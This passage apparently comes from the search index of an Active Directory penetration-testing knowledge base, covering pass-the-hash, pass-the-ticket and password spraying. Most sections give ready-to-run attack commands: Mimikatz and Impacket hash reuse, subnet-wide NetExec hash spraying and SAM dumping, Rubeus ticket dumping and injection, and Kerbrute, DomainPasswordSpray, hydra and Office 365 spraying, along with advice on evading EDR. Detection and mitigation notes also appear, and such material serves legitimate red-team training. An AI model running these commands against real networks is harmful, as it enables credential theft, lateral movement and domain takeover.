</ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/overpass_the_hash/#mitigation","title":"Mitigation","text":"<ul> <li>Implement credential guard to protect credential material in memory</li> <li>Use Protected Users security group for privileged accounts</li> <li>Enforce strong authentication policies</li> <li>Implement time-based restrictions on privileged account usage</li> <li>Deploy Privileged Access Workstations (PAWs) for administrative tasks</li> <li>Use Just-In-Time (JIT) administration to limit persistent admin rights</li> <li>Implement network segmentation to restrict lateral movement</li> <li>Deploy Advanced Threat Analytics or Microsoft Defender for Identity to detect suspicious Kerberos activity</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#technique/T1558.003","#stage/lateral-movement","#os/windows","#protocol/kerberos","#protocol/ntlm","#tool/mimikatz","#tool/rubeus"]},{"location":"Active%20Directory/flat/pass_the_hash/","title":"Pass the Hash","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#technique","title":"Technique","text":"<p>Pass the Hash (PtH) is a lateral movement technique that allows an attacker to authenticate to a remote system or service using the NTLM hash of a user's password rather than the plaintext password itself. This technique takes advantage of how Windows implements NTLM authentication, where the password hash is used directly in the authentication process.</p> <p>Since many organizations reuse local administrator credentials across multiple systems, obtaining the NTLM hash from one compromised system often enables an attacker to authenticate to other systems where the same account exists with the same password.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Administrative access on at least one system to extract NTLM hashes, or the ability to capture NTLM authentication traffic.</p> <p>System State: The target system must accept NTLM authentication (which is enabled by default in most Windows environments).</p> <p>Information: Valid username and NTLM hash pairs.</p> <p>Restrictions: This technique works primarily with the NTLM authentication protocol. It doesn't work with Kerberos authentication unless combined with other techniques like Overpass the Hash.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful Pass the Hash attacks allow an attacker to move laterally through a network without knowing plaintext passwords. If the hash belongs to a domain administrator or other privileged account, the attacker could potentially compromise the entire domain.</p> <p>OPSEC</p> <ul> <li>Authentication Logs: NTLM authentication events are logged on target systems (Event ID 4624 with logon type 3).</li> <li>Network Traffic: NTLM authentication can be detected through network monitoring.</li> <li>Tool Detection: Tools like Mimikatz are commonly flagged by antivirus and EDR solutions.</li> <li>Unusual Source: Authentication attempts from unusual source hosts may trigger alerts.</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#using-mimikatz","title":"Using Mimikatz","text":"<p>Mimikatz can be used to pass the hash from a Windows system:</p> <pre><code># Start a new process using a stolen hash\nmimikatz # sekurlsa::pth /user:administrator /domain:contoso.local /ntlm:e2b475c11da2a0748290d87aa966c327\n</code></pre> <p>This will launch a new command prompt with a network logon session using the specified credentials.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#using-impacket-from-linux","title":"Using Impacket (from Linux)","text":"<p>Several Impacket tools support Pass the Hash:</p> <pre><code># Access a remote shell using PsExec and a hash\nimpacket-psexec contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327\n\n# Access files using SMB and a hash\nimpacket-smbclient contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327\n\n# Execute WMI commands using a hash\nimpacket-wmiexec contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#using-netexec-from-linux","title":"Using NetExec (from Linux)","text":"<p>NetExec is particularly useful for checking multiple systems:</p> <pre><code># Test login against multiple hosts\nnxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327\n\n# Execute a command if login succeeds\nnxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327 -x \"whoami\"\n\n# Dump SAM hashes if login succeeds\nnxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327 --sam\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#using-evil-winrm-from-linux","title":"Using Evil-WinRM (from Linux)","text":"<p>For systems with WinRM enabled:</p> <pre><code>evil-winrm -i 192.168.1.10 -u administrator -H e2b475c11da2a0748290d87aa966c327\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Log out of any sessions created using Pass the Hash</li> <li>Close any command shells or connections opened with the technique</li> <li>Be aware that authentication events remain in the logs</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#detection","title":"Detection","text":"<ul> <li>Monitor for Event ID 4624 (successful logon) with logon type 3 (network)</li> <li>Look for multiple logons with the same account from different source systems</li> <li>Monitor for suspicious execution of tools like Mimikatz</li> <li>Watch for NTLM authentication attempts in environments that primarily use Kerberos</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_hash/#mitigation","title":"Mitigation","text":"<ul> <li>Implement LAPS (Local Administrator Password Solution): Ensures local administrator accounts have unique passwords on each system</li> <li>Restrict Local Admin Rights: Limit which users have administrative access to workstations</li> <li>Use Privileged Access Workstations (PAWs): For administrative tasks</li> <li>Enable Credential Guard: In Windows 10/Server 2016 and later to protect credential material</li> <li>Disable NTLM Authentication: Where possible, forcing the use of Kerberos</li> <li>Network Segmentation: Limit lateral movement opportunities</li> <li>Deploy Microsoft ATA/Defender for Identity: To detect Pass the Hash and other credential theft techniques</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.002","#stage/lateral-movement","#os/windows","#protocol/ntlm","#tool/mimikatz","#tool/netexec","#tool/impacket"]},{"location":"Active%20Directory/flat/pass_the_ticket/","title":"Pass the ticket","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#technique","title":"Technique","text":"<p>Pass-the-Ticket (PtT) is a lateral movement technique that uses a stolen Kerberos ticket to authenticate to systems and access resources as the impersonated user. This attack bypasses the need to extract credentials from protected processes like LSASS, making it effective in hardened environments where credential dumping is monitored or prevented.</p> <p>The attack leverages a stolen Ticket Granting Ticket (TGT) or a service ticket (TGS). An attacker can use this ticket from a different machine to request new service tickets from the Domain Controller and gain access to network resources, effectively impersonating the user without ever knowing their password.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Administrative rights are required on the source machine to dump Kerberos tickets from memory, as they belong to other users' logon sessions.</p> <p>System State: The attacker must have a foothold on a domain-joined machine where a target user is currently logged in or has an active Kerberos ticket cached.</p> <p>Information: The attacker needs to identify a valid Kerberos ticket in memory to steal.</p> <p>Misc: Your system time must be synced with the DC. If your time is too skewed, the ticket will be considered invalid.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful PtT allows an attacker to move laterally across the network and access any resources the impersonated user has permissions for. If the stolen ticket belongs to a Domain Administrator, the attacker gains full control over the domain.</p> <p>OPSEC</p> <ul> <li> <p>Tooling Footprint: Executing tools like <code>Rubeus.exe</code> from disk creates obvious IOCs (process name, file hash, arguments) for EDR. Prefer in-memory execution or integrated C2 capabilities to avoid detection.</p> </li> <li> <p>Logon Artifacts: Creating a sacrificial process generates a detectable <code>LOGON_TYPE = 9</code> event. This is a direct trade-off between preventing service outages and maintaining stealth.</p> </li> <li> <p>Suspicious Service Requests: After passing a ticket, the host's requests for new service tickets can appear abnormal.</p> </li> </ul> <p>DANGER: Sacrificial Processes: It is critical to inject stolen tickets into a \"sacrificial process\" rather than overwriting the ticket of an existing logon session. Overwriting a ticket for a critical process (like <code>SYSTEM$</code>) or a service can cause an outage, as the service may not be able to re-authenticate until it is restarted. Using a sacrificial process creates a new, isolated logon session for the ticket. While this is safer, creating a new logon session (<code>LOGON_TYPE = 9</code>) is an Indicator of Compromise (IOC) that can be detected.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#create-a-sacrificial-process","title":"Create a Sacrificial Process","text":"<p>To avoid overwriting existing tickets and potentially causing service disruptions, create a new process with its own logon session. Rubeus can create this process, which will be used for ticket injection. The <code>/show</code> flag makes the new command window visible.</p> <p><pre><code>.\\Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> The output provides the Logon ID (LUID) of the new session. Save this for later.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#identify-tickets-in-original-session","title":"Identify Tickets (In original session)","text":"<pre><code>.\\Rubeus.exe triage\n</code></pre> <p>Once a target ticket is identified (e.g., a ticket for <code>admin@DOMAIN.LOCAL</code> with the service <code>krbtgt</code>), save its LUID.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#dump-the-target-ticket-with-its-luid-in-original-session","title":"Dump the target ticket with its LUID (In original session)","text":"<pre><code>.\\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap\n</code></pre> <p>This command outputs the user's ticket in Base64 format.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#pass-the-ticket-ptt-in-sacrificial-process","title":"Pass the Ticket (PTT) (In Sacrificial Process)","text":"<p>Inject the stolen ticket into the current logon session. The <code>/ptt</code> flag passes the ticket directly into memory.</p> <pre><code>Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA&lt;SNIP&gt; /ptt\n</code></pre> <p>Rerun <code>klist</code> to confirm that the ticket for the target user is now in our current session.</p> <pre><code>klist\n</code></pre> <p>The output should now show the impersonated user's ticket. With this ticket in memory, any network action you perform will be on behalf of that user. For example, accessing a Domain Controller's C$ share.</p> <p><pre><code>dir \\\\dc01\\c$\n</code></pre> Windows will automatically use the injected TGT to request a TGS for the <code>cifs/dc01</code> service and grant you access.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#cleanup-considerations","title":"Cleanup Considerations","text":"<p>Terminating the sacrificial process will destroy the associated logon session and the injected tickets.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#detection","title":"Detection","text":"<ul> <li> <p>Monitor for process creation events associated with <code>LOGON_TYPE = 9</code> (New Credentials), which tools like Rubeus use to create sacrificial processes.</p> </li> <li> <p>Audit for Kerberos service ticket requests (Event ID 4769) originating from unusual hosts or at anomalous times.</p> </li> <li> <p>Network traffic analysis can potentially identify a ticket being used from an IP address not associated with the legitimate user.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/pass_the_ticket/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Limit Admin Privileges: Restricting local administrator rights prevents attackers from being able to dump tickets from other users' sessions on a machine.</p> </li> <li> <p>Protected Users Group: Add high-privilege accounts to the \"Protected Users\" group in Active Directory. This enforces security controls that make it much harder to steal or use their tickets, such as disabling credential caching.</p> </li> <li> <p>Microsoft Defender for Identity: Can detect anomalous ticket usage across the network, which is a key indicator of a Pass-the-Ticket attack.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1550.003","#stage/lateral-movement","#os/windows","#tool/rubeus","#tool/klist","#protocol/kerberos"]},{"location":"Active%20Directory/flat/password_attacks/","title":"Password Attacks","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#technique","title":"Technique","text":"<p>Password attacks encompass various techniques used to compromise user credentials, including password spraying, brute force attacks, and credential stuffing. These attacks are often used to gain initial access to a network or to escalate privileges after obtaining a foothold.</p> <p>Attackers typically target high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Varies by attack type - some require network access, others require an existing foothold.</p> <p>System State: Target systems must be accessible via network and running authentication services.</p> <p>Information: Valid usernames, password policies, and knowledge of the target environment.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#wordlist-generation","title":"Wordlist Generation","text":"<p>Creating effective wordlists is crucial for successful password attacks. The process involves gathering relevant words and applying transformation rules.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#basic-wordlist-creation","title":"Basic Wordlist Creation","text":"<pre><code># Add likely words to a file (domain name, seasons, employees, etc.)\necho \"companyname\" &gt; words.txt\necho \"companyname2023\" &gt;&gt; words.txt\necho \"companyname2024\" &gt;&gt; words.txt\necho \"winter\" &gt;&gt; words.txt\necho \"summer\" &gt;&gt; words.txt\necho \"welcome\" &gt;&gt; words.txt\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-hashcat-for-wordlist-generation","title":"Using Hashcat for Wordlist Generation","text":"<pre><code># Use hashcat with ruleset to generate alterations\nhashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout &gt; wordlist.txt\n\n# Append common variations\necho \"password\" &gt;&gt; wordlist.txt\necho \"Password123\" &gt;&gt; wordlist.txt\necho \"Welcome1\" &gt;&gt; wordlist.txt\n\n# Add exclamation point to all words\nsed 's/$/!/' wordlist.txt &gt; wordlist_with_exclamation.txt\ncat wordlist.txt wordlist_with_exclamation.txt | sort -u &gt; final_wordlist.txt\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#custom-wordlist-generation","title":"Custom Wordlist Generation","text":"<pre><code># Create company-specific wordlist\necho -e \"companyname\\nCompanyname\\nCOMPANYNAME\\ncompany\\nCompany\\nCOMPANY\" &gt; company_words.txt\n\n# Add seasonal variations\necho -e \"spring\\nsummer\\nautumn\\nwinter\\nSpring2023\\nSummer2023\\nFall2023\\nWinter2023\" &gt;&gt; company_words.txt\n\n# Add common patterns\necho -e \"Welcome1\\nPassword123\\nchangeme\\nPassword1\\nP@ssw0rd\" &gt;&gt; company_words.txt\n\n# Generate combinations\nfor company in $(cat company_names.txt); do\n    for season in $(cat seasons.txt); do\n        echo \"${company}${season}\" &gt;&gt; wordlist.txt\n        echo \"${company}_${season}\" &gt;&gt; wordlist.txt\n        echo \"${company}-${season}\" &gt;&gt; wordlist.txt\n    done\ndone\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#password-spraying","title":"Password Spraying","text":"<p>Password spraying involves testing a small number of common passwords against a large number of accounts. This technique avoids account lockouts by limiting the number of attempts per account.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#from-linux","title":"From Linux","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-rpcclient","title":"Using rpcclient","text":"<pre><code># Test single password against multiple users\nfor u in $(cat valid_users.txt);do \n    rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; \ndone\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-kerbrute","title":"Using Kerbrute","text":"<pre><code># Spray password against domain users\nkerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1\n\n# Spray with custom user agent\nkerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 --user-agent \"Mozilla/5.0\"\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-netexec","title":"Using NetExec","text":"<pre><code># Spray password against multiple hosts\nnxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n\n# Test single user against multiple hosts\nnxc smb 172.16.5.5 -u avazquez -p Password123\n\n# Spray with delay between attempts\nnxc smb 172.16.5.0/24 -u valid_users.txt -p Password123 --delay 30\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#spray-local-admin-hash-around-domain","title":"Spray Local Admin Hash Around Domain","text":"<pre><code># Test local admin hash against multiple machines\nnxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre> <p>Note: The <code>--local-auth</code> flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#from-windows","title":"From Windows","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-domainpasswordspray","title":"Using DomainPasswordSpray","text":"<p>DomainPasswordSpray is a PowerShell tool for password spraying in Active Directory environments.</p> <pre><code># If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.\nInvoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n\n# Spray with custom user list\nInvoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n\n# Spray multiple passwords\nInvoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile spray_success -ErrorAction SilentlyContinue\n\n# Spray against specific domain controller\nInvoke-DomainPasswordSpray -Password Welcome1 -DomainController dc01.domain.local -OutFile spray_success\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#external-password-spraying","title":"External Password Spraying","text":"<p>External password spraying targets internet-facing services that use Active Directory authentication.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#common-targets","title":"Common Targets","text":"<ul> <li>Microsoft 365</li> <li>Outlook Web Exchange</li> <li>Exchange Web Access</li> <li>Skype for Business</li> <li>Lync Server</li> <li>Microsoft Remote Desktop Services (RDS) Portals</li> <li>Citrix portals using AD authentication</li> <li>VDI implementations using AD authentication such as VMware Horizon</li> <li>VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)</li> <li>Custom web applications that use AD authentication</li> </ul>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#o365-password-spraying","title":"O365 Password Spraying","text":"<pre><code># Using MSFconsole\nmsfconsole\nuse auxiliary/scanner/http/ms_office365_sprayer\nset RHOSTS login.microsoftonline.com\nset USERFILE users.txt\nset PASSWORD Welcome1\nrun\n\n# Using o365spray (Python tool)\npython3 o365spray.py -u users.txt -p Password123\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#rdp-password-spraying","title":"RDP Password Spraying","text":"<pre><code># Using crowbar\ncrowbar -b rdp -s 192.168.1.0/24 -u users.txt -C passwords.txt\n\n# Using hydra\nhydra -L users.txt -P passwords.txt rdp://192.168.1.10\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#workarounds-for-common-issues","title":"Workarounds for Common Issues","text":"","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#password-must-be-changed-on-next-logon-password_must_change","title":"\"Password must be changed on next logon\" (Password_must_change)","text":"<p>When encountering accounts that require password change on next logon, there are two potential workarounds:</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-rpcclient_1","title":"Using rpcclient","text":"<pre><code>rpcclient -U &lt;user&gt; &lt;IP&gt;\nrpcclient $&gt; setuserinfo2 &lt;user&gt; 23 'Password123!'\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#using-smbpasswd","title":"Using smbpasswd","text":"<pre><code>smbpasswd -U &lt;user&gt; -r &lt;IP&gt;\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#remote-enumeration","title":"Remote Enumeration","text":"<pre><code># Using NetExec\nnxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n\n# Using ldapsearch\nldapsearch -x -H ldap://&lt;IP&gt; -D \"&lt;user&gt;@&lt;domain&gt;\" -w \"&lt;password&gt;\" -b \"DC=domain,DC=local\" \"(objectClass=user)\" description sAMAccountName\n</code></pre>","tags":["#type/technique","#tactic/TA0001","#tactic/TA0006","#technique/T1110","#technique/T1200","#stage/initial-access","#stage/credential-access","#os/windows","#os/linux","#tool/hashcat","#tool/john","#tool/netexec","#tool/kerbrute","#tool/domainpasswordspray"]},{"location":"Active%20Directory/flat/password_attacks/#local-enumeration","title":"Local Enumeration","text":"<pre><code># Using 